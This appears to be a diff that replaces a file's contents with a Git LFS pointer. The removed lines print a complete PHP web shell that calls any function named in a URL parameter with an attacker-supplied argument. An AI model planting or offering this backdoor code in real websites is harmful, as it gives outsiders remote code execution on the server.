@@ -1,5 +1,3 @@
-
-<?php
-    $func = new ReflectionFunction($_GET[m]);
-    echo $func->invokeArgs(array($_GET[c]));
-?>
+version https://git-lfs.github.com/spec/v1
+oid sha256:3c49ad220b504f5af45e03ecf43e4e7b2d11eca7ad08fe3b5b9d52a440eab048
+size 100
